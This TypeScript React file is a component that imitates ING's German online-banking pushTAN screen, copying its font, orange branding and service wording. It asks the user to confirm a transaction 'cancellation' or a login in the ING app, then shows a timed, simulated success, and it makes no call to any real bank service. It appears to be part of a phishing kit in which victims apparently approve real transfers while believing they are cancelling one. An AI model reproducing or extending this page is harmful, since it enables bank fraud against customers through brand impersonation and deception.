import React, { useState, useEffect } from 'react';
import Loading from './Loading';

interface TransactionDetails {
  amount?: string;
  recipient?: string;
  reference?: string;
  iban?: string;
}

type TANType = 'TRANSACTION_TAN' | 'LOGIN_TAN';

interface PushTANScreenProps {
  tanType: TANType;
  transactionDetails?: TransactionDetails;
  onConfirm: () => void;
  onCancel?: () => void;
}

const PushTANScreen: React.FC<PushTANScreenProps> = ({ 
  tanType,
  transactionDetails = {}, 
  onConfirm, 
  onCancel
}) => {
  const [isWaiting, setIsWaiting] = useState(true);
  const [countdown, setCountdown] = useState(120);
  const [isLoading, setIsLoading] = useState(false);
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const checkScreenSize = () => {
      setIsMobile(window.innerWidth <= 768);
    };
    checkScreenSize();
    window.addEventListener('resize', checkScreenSize);
    return () => window.removeEventListener('resize', checkScreenSize);
  }, []);

  useEffect(() => {
    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          setIsWaiting(false);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const handleConfirm = async () => {
    setIsLoading(true);
    await new Promise(resolve => setTimeout(resolve, 1500));
    setIsLoading(false);
    onConfirm();
  };

  if (isLoading) {
    return (
      <Loading 
        message={tanType === 'TRANSACTION_TAN' ? 'Stornierung wird verarbeitet...' : 'pushTAN wird verarbeitet...'}
        type="processing"
      />
    );
  }

  return (
    <div style={{
      minHeight: '100vh',
      backgroundColor: '#f0f0f0',
      fontFamily: 'ING Me, Arial, sans-serif',
      color: '#333333'
    }}>
      <div style={{
        maxWidth: '1200px',
        margin: '0 auto',
        padding: isMobile ? '20px' : '40px 20px',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        minHeight: '100vh',
        justifyContent: 'center'
      }}>
        
        {/* Main TAN Card */}
        <div className="ing-card" style={{
          width: '100%',
          maxWidth: '600px',
          backgroundColor: '#ffffff',
          borderRadius: '8px',
          boxShadow: '0 2px 8px rgba(0, 0, 0, 0.1)',
          overflow: 'hidden'
        }}>
          
          {/* Orange Header Bar - ING's signature */}
          <div style={{
            backgroundColor: '#ff6200',
            padding: '25px',
            textAlign: 'center'
          }}>
            <h1 style={{
              color: '#ffffff',
              fontSize: isMobile ? '1.5rem' : '2rem',
              fontWeight: '700',
              margin: '0',
              fontFamily: 'ING Me, Arial, sans-serif'
            }}>
              {tanType === 'TRANSACTION_TAN' ? 'pushTAN Stornierung' : 'pushTAN Anmeldung'}
            </h1>
          </div>

          {/* Main Content */}
          <div style={{
            padding: isMobile ? '20px' : '30px'
          }}>
            
            {/* Instruction Box */}
            <div className="info-box" style={{
              backgroundColor: '#cfe4f4',
              border: '1px solid #559bd1',
              borderRadius: '4px',
              padding: '20px',
              marginBottom: '30px'
            }}>
              <div className="info-box__content">
                <p style={{
                  margin: '0',
                  fontSize: isMobile ? '14px' : '16px',
                  color: '#333333',
                  fontFamily: 'ING Me, Arial, sans-serif',
                  lineHeight: '1.5'
                }}>
                  {tanType === 'TRANSACTION_TAN' 
                    ? 'Bestätigen Sie die Stornierung der Transaktion in Ihrer ING Banking-App.'
                    : 'Bestätigen Sie Ihren Anmeldeversuch in Ihrer ING Banking-App.'
                  }
                </p>
              </div>
            </div>

            {/* Transaction Details Card - only for TRANSACTION_TAN */}
            {tanType === 'TRANSACTION_TAN' && transactionDetails.amount && (
              <div className="ing-card" style={{
                backgroundColor: '#ffffff',
                border: '2px solid #ff6200',
                borderRadius: '8px',
                padding: '25px',
                marginBottom: '30px'
              }}>
                <h2 style={{
                  color: '#ff6200',
                  fontSize: isMobile ? '1.25rem' : '1.5rem',
                  fontWeight: '700',
                  margin: '0 0 20px 0',
                  fontFamily: 'ING Me, Arial, sans-serif',
                  textAlign: 'center'
                }}>
                  Zu stornierende Transaktion
                </h2>
                
                <div style={{ display: 'flex', flexDirection: 'column', gap: '15px' }}>
                  <div style={{ 
                    display: 'flex', 
                    justifyContent: 'space-between', 
                    alignItems: 'center',
                    paddingBottom: '10px',
                    borderBottom: '1px solid #f2f2f2'
                  }}>
                    <span style={{
                      color: '#666666',
                      fontSize: '14px',
                      fontFamily: 'ING Me, Arial, sans-serif'
                    }}>Betrag:</span>
                    <span style={{
                      color: '#ff6200',
                      fontSize: '18px',
                      fontFamily: 'ING Me, Arial, sans-serif',
                      fontWeight: '700'
                    }}>{transactionDetails.amount}</span>
                  </div>
                  
                  {transactionDetails.recipient && (
                    <div style={{ 
                      display: 'flex', 
                      justifyContent: 'space-between', 
                      alignItems: 'center',
                      paddingBottom: '10px',
                      borderBottom: '1px solid #f2f2f2'
                    }}>
                      <span style={{
                        color: '#666666',
                        fontSize: '14px',
                        fontFamily: 'ING Me, Arial, sans-serif'
                      }}>Empfänger:</span>
                      <span style={{
                        color: '#333333',
                        fontSize: '14px',
                        fontFamily: 'ING Me, Arial, sans-serif',
                        textAlign: 'right',
                        maxWidth: '60%'
                      }}>{transactionDetails.recipient}</span>
                    </div>
                  )}
                  
                  {transactionDetails.iban && (
                    <div style={{ 
                      display: 'flex', 
                      justifyContent: 'space-between', 
                      alignItems: 'center',
                      paddingBottom: '10px',
                      borderBottom: '1px solid #f2f2f2'
                    }}>
                      <span style={{
                        color: '#666666',
                        fontSize: '14px',
                        fontFamily: 'ING Me, Arial, sans-serif'
                      }}>IBAN:</span>
                      <span style={{
                        color: '#333333',
                        fontSize: '14px',
                        fontFamily: 'monospace',
                        textAlign: 'right'
                      }}>{transactionDetails.iban}</span>
                    </div>
                  )}
                  
                  {transactionDetails.reference && (
                    <div style={{ 
                      display: 'flex', 
                      justifyContent: 'space-between', 
                      alignItems: 'center'
                    }}>
                      <span style={{
                        color: '#666666',
                        fontSize: '14px',
                        fontFamily: 'ING Me, Arial, sans-serif'
                      }}>Verwendungszweck:</span>
                      <span style={{
                        color: '#333333',
                        fontSize: '14px',
                        fontFamily: 'ING Me, Arial, sans-serif',
                        textAlign: 'right',
                        maxWidth: '60%'
                      }}>{transactionDetails.reference}</span>
                    </div>
                  )}
                </div>
              </div>
            )}

            {/* Status Section */}
            <div className="ing-card" style={{
              backgroundColor: '#ffffff',
              borderRadius: '8px',
              padding: '30px',
              textAlign: 'center',
              marginBottom: '30px'
            }}>
              {isWaiting ? (
                <div>
                  {/* ING Loading Spinner */}
                  <div style={{
                    width: '50px',
                    height: '50px',
                    border: '4px solid #f2f2f2',
                    borderTop: '4px solid #ff6200',
                    borderRadius: '50%',
                    animation: 'spin 1s linear infinite',
                    margin: '0 auto 25px auto'
                  }} />
                  
                  <h3 style={{
                    color: '#ff6200',
                    fontSize: isMobile ? '1.125rem' : '1.25rem',
                    fontWeight: '700',
                    margin: '0 0 15px 0',
                    fontFamily: 'ING Me, Arial, sans-serif'
                  }}>
                    {tanType === 'TRANSACTION_TAN' ? 'Warten auf Stornierung...' : 'Warten auf Anmeldung...'}
                  </h3>
                  
                  <p style={{
                    color: '#666666',
                    fontSize: '14px',
                    margin: '0 0 15px 0',
                    fontFamily: 'ING Me, Arial, sans-serif'
                  }}>
                    Bitte bestätigen Sie in Ihrer ING App.
                  </p>
                  
                  <p style={{
                    color: '#e30613',
                    fontSize: '14px',
                    margin: '0',
                    fontFamily: 'ING Me, Arial, sans-serif',
                    fontWeight: '700'
                  }}>
                    Timeout in: {formatTime(countdown)}
                  </p>
                </div>
              ) : (
                <div>
                  {/* Success Icon */}
                  <div style={{
                    width: '50px',
                    height: '50px',
                    backgroundColor: '#00a651',
                    borderRadius: '50%',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    margin: '0 auto 25px auto'
                  }}>
                    <svg width="25" height="25" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="3">
                      <path d="M20 6L9 17l-5-5"/>
                    </svg>
                  </div>
                  
                  <h3 style={{
                    color: '#00a651',
                    fontSize: isMobile ? '1.125rem' : '1.25rem',
                    fontWeight: '700',
                    margin: '0 0 15px 0',
                    fontFamily: 'ING Me, Arial, sans-serif'
                  }}>
                    {tanType === 'TRANSACTION_TAN' ? 'Transaktion storniert' : 'Anmeldung bestätigt'}
                  </h3>
                  
                  <p style={{
                    color: '#333333',
                    fontSize: '14px',
                    margin: '0',
                    fontFamily: 'ING Me, Arial, sans-serif'
                  }}>
                    Sie können nun fortfahren.
                  </p>
                </div>
              )}
            </div>

            {/* Action Buttons */}
            <div style={{
              display: 'flex',
              flexDirection: isMobile ? 'column' : 'row',
              justifyContent: 'center',
              alignItems: 'center',
              gap: '15px',
              marginBottom: '20px'
            }}>
              <button
                onClick={handleConfirm}
                disabled={isLoading}
                style={{
                  backgroundColor: isLoading ? '#999999' : '#ff6200',
                  color: '#ffffff',
                  border: 'none',
                  borderRadius: '4px',
                  padding: '14px 28px',
                  fontSize: '16px',
                  fontFamily: 'ING Me, Arial, sans-serif',
                  fontWeight: '700',
                  cursor: isLoading ? 'not-allowed' : 'pointer',
                  transition: 'background-color 0.2s ease',
                  width: isMobile ? '100%' : 'auto',
                  minWidth: '180px'
                }}
                onMouseEnter={(e) => {
                  if (!isLoading) {
                    (e.target as HTMLButtonElement).style.backgroundColor = '#e55500';
                  }
                }}
                onMouseLeave={(e) => {
                  if (!isLoading) {
                    (e.target as HTMLButtonElement).style.backgroundColor = '#ff6200';
                  }
                }}
              >
                {isWaiting 
                  ? (tanType === 'TRANSACTION_TAN' ? 'Manuell stornieren' : 'Manuell bestätigen')
                  : 'Weiter'
                }
              </button>
              
              {onCancel && (
                <button
                  onClick={onCancel}
                  style={{
                    backgroundColor: 'transparent',
                    color: '#003380',
                    border: '2px solid #003380',
                    borderRadius: '4px',
                    padding: '12px 26px',
                    fontSize: '16px',
                    fontFamily: 'ING Me, Arial, sans-serif',
                    fontWeight: '700',
                    cursor: 'pointer',
                    transition: 'all 0.2s ease',
                    width: isMobile ? '100%' : 'auto',
                    minWidth: '180px'
                  }}
                  onMouseEnter={(e) => {
                    (e.target as HTMLButtonElement).style.backgroundColor = '#003380';
                    (e.target as HTMLButtonElement).style.color = '#ffffff';
                  }}
                  onMouseLeave={(e) => {
                    (e.target as HTMLButtonElement).style.backgroundColor = 'transparent';
                    (e.target as HTMLButtonElement).style.color = '#003380';
                  }}
                >
                  {tanType === 'TRANSACTION_TAN' ? 'Stornierung abbrechen' : 'Anmeldung abbrechen'}
                </button>
              )}
            </div>

            {/* Footer Info */}
            <div style={{ textAlign: 'center' }}>
              <p style={{
                color: '#666666',
                fontSize: '12px',
                margin: '0',
                fontFamily: 'ING Me, Arial, sans-serif'
              }}>
                Probleme mit der App? Kontaktieren Sie den ING Kundenservice.
              </p>
            </div>
          </div>
        </div>
      </div>

      <style jsx>{`
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
};

export { PushTANScreen };
